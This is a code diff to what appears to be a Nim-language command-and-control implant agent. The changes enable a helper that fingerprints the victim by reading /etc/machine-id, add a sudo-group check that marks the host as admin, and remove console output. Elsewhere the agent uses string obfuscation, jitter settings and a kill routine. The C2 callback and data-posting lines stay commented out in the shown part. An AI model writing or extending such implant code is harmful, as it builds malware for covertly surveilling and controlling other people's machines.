@@ -23,13 +23,12 @@ proc run_shell_command(shell_command: string): bool
 # proc kill_agent(): void
 
 # Helpers
-# proc get_agent_id(): string
+proc get_agent_id(): string
 # proc calc_sleep_time(timeframe: int,  jitter_percent: int): int
 
 # Globals
 # let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
-# let client = newHttpClient(userAgent=get_agent_id())
-let client = newHttpClient()
+let client = newHttpClient(userAgent=get_agent_id())
 
 
 #########################
@@ -72,7 +71,13 @@ proc collect_data(): bool =
         is_admin = "True"
         is_elevated = "True"
     else: 
-        is_admin = "False"
+        try:
+            if protectString("(sudo)") in execCmdEx(protectString("id"))[0]:
+                is_admin = "True"
+            else:
+                is_admin = "False"
+        except:
+            is_admin = could_not_retrieve
         is_elevated = "False"
     try:
         ipv4_local = execCmdEx(protectString("hostname -i"))[0].replace("\n", "")
@@ -116,7 +121,7 @@ proc run_shell_command(shell_command: string): bool =
     }.toOrderedTable()
 
     # is_success = post_data(protectString("cmd"), $data)
-    echo output
+    
     return is_success
 
 
@@ -124,6 +129,12 @@ proc run_shell_command(shell_command: string): bool =
 ######## Helpers ########
 #########################
 
+proc get_agent_id(): string =
+    var machine_id = readFile(protectString("/etc/machine-id"))
+    var user_agent = machine_id
+    crc32(user_agent)
+    return user_agent
+    
 
 ##########################
 ##### Core functions #####
